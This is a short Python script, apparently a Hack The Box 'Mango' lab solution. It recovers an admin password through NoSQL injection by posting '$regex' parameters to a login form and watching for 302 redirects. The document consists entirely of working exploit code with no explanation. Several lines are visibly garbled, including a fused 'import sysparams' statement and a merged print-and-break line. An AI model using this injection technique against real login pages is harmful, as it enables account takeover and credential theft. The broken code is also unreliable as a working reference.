#!/usr/bin/env python
import requests
import sysparams = {}
params["username"] = 'admin'
params["login"] = 'login'
headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": "http://staging-order.mango.htb/",
        "Content-Type": "application/x-www-form-urlencoded"
}
enum_val = 0
character_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-=_+[]\{}|;':\",./<>?`~   "
password = '^'
while True:
    characters = ['\s', '\w', '\d', '\W', '\\x','\X']
    for value in characters:
        temp_password = password + str(value)
        params["password[$regex]"] = '%s.*' % temp_password
        response = requests.post('http://staging-order.mango.htb', data=params , allow_redirects=False)
        print('Trying: {} got: {}'.format(params["password[$regex]"], response.status_code))    break
while len(password) < 14:
    for value in character_list:
        if value in ('\\', '*', '?', '{', '}', '(',')','.', '^', '$','+', '|', '#'):
            value = '\\' + str(value)
            print('New special value: {}'.format(value))
        temp_password = password + str(value )
        params["password[$regex]"] = temp_password 
        response = requests.post('http://staging-order.mango.htb', data=params , allow_redirects=False)
        print('Trying: {} got: {}'.format(params["password[$regex]"], response.status_code))
        if response.status_code == 302:
            password = temp_password
            break
    print('Iterating Password: Password: {}'.format(password))
